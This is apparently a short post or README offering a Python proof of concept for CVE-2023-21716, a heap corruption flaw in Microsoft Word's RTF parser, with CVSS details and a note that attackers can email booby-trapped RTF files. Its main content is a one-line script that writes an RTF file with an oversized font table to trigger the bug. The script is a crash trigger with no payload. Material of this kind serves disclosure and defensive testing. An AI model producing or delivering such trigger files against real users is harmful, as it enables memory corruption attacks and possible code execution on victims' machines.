**CVE-2023-21716 (Microsoft Word RCE) Python PoC**

CNA:  Microsoft Corporation  
Base Score:  9.8 CRITICAL  
Vector:  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  
  
Note:  
It is a heap corruption vulnerability in Microsoft Word’s RTF parser that, if triggered, allows attackers to achieve remote code execution with the privileges of the victim. The flaw does not require prior authentication: attackers can simply send a booby-trapped RTF file to the victim(s) via email.  
“Microsoft Office 2010 and later use Protected View to limit damage caused by malicious documents procured from untrusted sources. Protected View is in effect when this vulnerability manifests and thus an additional sandbox escape vulnerability would be required to gain full privileges  
  

  

  

Code:

```python
open("t3zt.rtf","wb").write(("{\\rtf1{\n{\\fonttbl" + "".join([ ("{\\f%dA;}\n" % i) for i in range(0,32761) ]) + "}\n{\\rtlch no crash??}\n}}\n").encode('utf-8'))
```
